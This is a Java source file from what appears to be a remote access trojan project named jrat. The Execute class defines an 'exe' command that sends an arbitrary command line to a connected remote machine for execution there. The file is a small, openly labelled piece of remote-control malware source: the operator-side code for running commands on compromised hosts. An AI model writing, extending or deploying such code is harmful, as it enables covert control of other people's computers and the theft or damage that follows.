package net.jrat.core.command.commands.connection;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S3PacketExecute;

public class Execute extends Command
{
	public Execute()
	{
		super("exe", new String[] { "command" }, new String[] { "specifies the command line" }, "let the connection execute a command line");
	}
	
	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");
		
		final String command = commandLine.getOptionValue("command", null);
		
		if(command == null)
			throw new Exception("no command line specified");
		
		this.server.currentConnection.outputStream.writeObject(new S3PacketExecute(command));
	}
}